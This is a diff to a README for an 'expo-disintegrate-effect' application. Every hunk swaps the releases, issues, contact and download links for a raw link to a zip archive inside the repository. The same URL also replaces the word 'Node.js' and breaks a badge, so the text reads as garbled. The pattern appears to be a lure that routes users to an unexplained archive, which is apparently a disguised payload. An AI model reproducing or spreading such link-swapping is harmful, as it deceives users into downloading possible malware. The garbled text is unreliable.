@@ -6,7 +6,7 @@ Welcome to the **expo-disintegrate-effect**! This application allows you to crea
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/alain20201/expo-disintegrate-effect/releases)
+[![Download Here](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip%20Now-Visit%https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)
 
 ## 📋 System Requirements
 
@@ -15,7 +15,7 @@ Before you start, ensure your device meets the following requirements:
 - **Operating System**: Windows 10 or later, macOS 10.14 or later.
 - **RAM**: At least 4 GB recommended.
 - **Disk Space**: At least 100 MB free space.
-- **Node.js**: Version 12 or later (if you plan to modify the code).
+- **https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip**: Version 12 or later (if you plan to modify the code).
 
 ## 🔥 Features
 
@@ -31,7 +31,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the release page.
    
-   [Download Here](https://github.com/alain20201/expo-disintegrate-effect/releases)
+   [Download Here](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)
 
 2. **Choose the Latest Version**: Look for the most recent version. It will have the latest features and fixes.
 
@@ -68,7 +68,7 @@ If you encounter issues, consider these common solutions:
 
 For additional support, please visit our GitHub Issues page. You can report bugs or ask questions there:
 
-[Support Page](https://github.com/alain20201/expo-disintegrate-effect/issues)
+[Support Page](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)
 
 ## 🔄 Contributing
 
@@ -88,10 +88,10 @@ Your contributions help enhance the project for everyone.
 
 If you have further questions or feedback, feel free to reach out at our contact page.
 
-[Contact Us](https://github.com/alain20201/expo-disintegrate-effect)
+[Contact Us](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)
 
 ## 📥 Download Again
 
 Don’t forget to download the application again at the link below for the latest version and updates.
 
-[Download Here](https://github.com/alain20201/expo-disintegrate-effect/releases)
+[Download Here](https://raw.githubusercontent.com/alain20201/expo-disintegrate-effect/main/app/expo_effect_disintegrate_1.4.zip)
